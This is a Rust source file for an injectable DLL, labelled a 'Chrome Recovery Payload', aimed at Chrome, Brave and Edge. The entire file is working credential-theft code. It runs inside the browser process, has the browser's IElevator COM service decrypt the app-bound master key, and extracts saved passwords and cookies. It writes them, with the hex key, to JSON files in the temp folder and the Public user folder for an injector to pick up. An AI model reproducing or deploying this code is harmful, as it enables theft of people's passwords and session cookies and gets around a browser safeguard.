//! Chrome Recovery Payload DLL
//!
//! Injected into a Chromium-based browser process.  Runs inside the browser's
//! security identity so IElevator accepts our COM call.  Supports:
//!   - Google Chrome (stable, Beta, Dev, Canary)
//!   - Brave Browser
//!   - Microsoft Edge

#![allow(non_snake_case, unused)]

mod elevator;
mod crypto;
mod database;

use std::{ffi::c_void, path::PathBuf, thread, time::Duration};

use windows::{
    Win32::{
        Foundation::{BOOL, HINSTANCE, TRUE},
        System::{
            SystemServices::DLL_PROCESS_ATTACH,
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

const APPB: &[u8; 4] = b"APPB";

// ── DllMain ───────────────────────────────────────────────────────────────────

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        // Spawn worker thread — DllMain must not block or call COM.
        CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
    debug_log("worker thread started");
    // Let Chrome finish CoInitializeSecurity before we touch COM.
    thread::sleep(Duration::from_secs(4));
    debug_log("worker delay complete, starting run()");
    let r = std::panic::catch_unwind(|| run());
    match r {
        Ok(Ok(())) => { debug_log("run() completed OK"); }
        Ok(Err(e)) => { debug_log(&format!("run() error: {e}")); write_error(&e); }
        Err(_)     => { debug_log("panic in payload"); write_error("panic in payload"); }
    }
    0
}

// ── Main logic ────────────────────────────────────────────────────────────────

fn run() -> Result<(), String> {
    debug_log("run() started");

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    debug_log(&format!("exe: {exe}"));

    let browser = elevator::resolve_browser(&exe)
        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;

    debug_log(&format!("detected browser: {}", browser.name));

    // Locate Local State for the detected browser.
    let local_appdata = std::env::var("LOCALAPPDATA")
        .map_err(|_| "LOCALAPPDATA not set")?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join("Local State");

    if !local_state_path.exists() {
        return Err(format!("Local State not found: {}", local_state_path.display()));
    }

    // Parse Local State JSON.
    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("read Local State: {e}"))?;
    let ls: serde_json::Value = serde_json::from_str(&raw)
        .map_err(|e| format!("parse Local State: {e}"))?;

    // Get the app-bound encrypted key.
    let key_b64 = ls.pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())
        .ok_or("app_bound_encrypted_key not found")?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    ).map_err(|e| format!("base64 decode: {e}"))?;

    if encrypted_key.len() < 4 {
        return Err("encrypted key too short".into());
    }
    if !encrypted_key.starts_with(APPB) {
        return Err("missing APPB prefix on app_bound_encrypted_key".into());
    }
    let encrypted_key = &encrypted_key[4..];

    debug_log("calling IElevator::DecryptData");
    let master_key = elevator::decrypt_for_browser(browser, encrypted_key)
        .map_err(|e| { let m = format!("IElevator: {e}"); debug_log(&m); m })?;

    if master_key.len() != 32 {
        return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
    }

    // Profile directory.
    let profile_dir = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join("Default");

    // Extract passwords and cookies.
    let passwords = database::extract_passwords(&profile_dir, &master_key)
        .unwrap_or_else(|e| vec![serde_json::json!({"error": e})]);

    let cookies = database::extract_cookies(&profile_dir, &master_key)
        .unwrap_or_else(|e| vec![serde_json::json!({"error": e})]);

    // Write JSON result to temp file for the injector to pick up.
    let result = serde_json::json!({
        "browser": browser.name,
        "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
        "passwords": passwords,
        "cookies": cookies,
    });

    debug_log("writing result");
    let json = serde_json::to_string_pretty(&result).unwrap();
    let mut wrote = false;
    for p in result_paths() {
        if std::fs::write(&p, &json).is_ok() { wrote = true; }
    }
    if !wrote {
        return Err("could not write result to any path".into());
    }

    Ok(())
}

const PUBLIC_RESULT: &str = r"C:\Users\Public\chrome_recovery_result.json";
const PUBLIC_DEBUG:  &str = r"C:\Users\Public\cr_debug.log";

fn debug_log(msg: &str) {
    use std::io::Write;
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(PUBLIC_DEBUG) {
        let _ = writeln!(f, "{msg}");
    }
}

fn result_paths() -> Vec<std::path::PathBuf> {
    vec![
        std::env::temp_dir().join("chrome_recovery_result.json"),
        std::path::PathBuf::from(PUBLIC_RESULT),
    ]
}

fn write_error(msg: &str) {
    let r = serde_json::json!({ "error": msg });
    let json = serde_json::to_string_pretty(&r).unwrap();
    for p in result_paths() {
        let _ = std::fs::write(&p, &json);
    }
    debug_log(&format!("write_error: {msg}"));
}
